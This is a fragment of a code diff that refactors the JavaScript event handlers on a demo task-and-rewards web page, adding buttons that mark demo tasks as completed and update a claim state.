-      if(taskBtn && taskPage){
-        taskBtn.addEventListener("click", function(){
-          taskPage.style.display = "block";
-        });
+      if(taskBtn){
+        taskBtn.addEventListener("click", showTaskPage);
       }
-      if(closeTaskBtn && taskPage){
-        closeTaskBtn.addEventListener("click", function(){
-          taskPage.style.display = "none";
+      if(backToRewardsBtn){
+        backToRewardsBtn.addEventListener("click", showRewardPage);
+      }
+
+      if(task1Btn){
+        task1Btn.addEventListener("click", function(){
+          task1Done = true;
+          markTaskState(task1CheckEl, true, "Task 1 completed (demo)", "Not completed");
+          updateClaimState();
         });
       }
 
-      if(taskCompleteBtn){
-        taskCompleteBtn.addEventListener("click", function(){
-          isTaskCompleted = true;
-          if(taskStatusTextEl){
-            taskStatusTextEl.style.display = "inline";
-          }
+      if(task2CheckBtn){
+        task2CheckBtn.addEventListener("click", handleTask2Check);
+      }
+
+      if(task3Btn){
+        task3Btn.addEventListener("click", function(){
+          task3Done = true;
+          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
           updateClaimState();
         });
       }
@@ -1119,4 +1085,3 @@
   </script>
 </body>
 </html>
-
